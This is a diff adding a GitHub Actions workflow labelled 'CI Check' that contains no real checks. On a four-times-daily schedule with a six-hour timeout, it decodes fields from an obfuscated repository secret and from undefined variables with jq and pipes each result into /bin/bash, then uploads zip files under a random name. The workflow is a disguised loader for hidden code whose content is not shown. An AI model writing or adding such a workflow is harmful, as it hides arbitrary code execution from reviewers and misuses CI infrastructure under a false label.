@@ -1,0 +1,33 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          lotru757: ${{ secrets.lotru757 }}
+        run: |
+          printf '%s' "$lotru757" | jq -r .odwhw52687 | /bin/bash
+          printf '%s' "$qco9" | jq -r .yjwri5 | /bin/bash
+          echo $aqf9919 | jq -r .fr22520 | /bin/bash
+          echo $dqnks67 | jq -r .d4315 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mpSSPAaS
+          path: "*.zip"
+          retention-days: 1
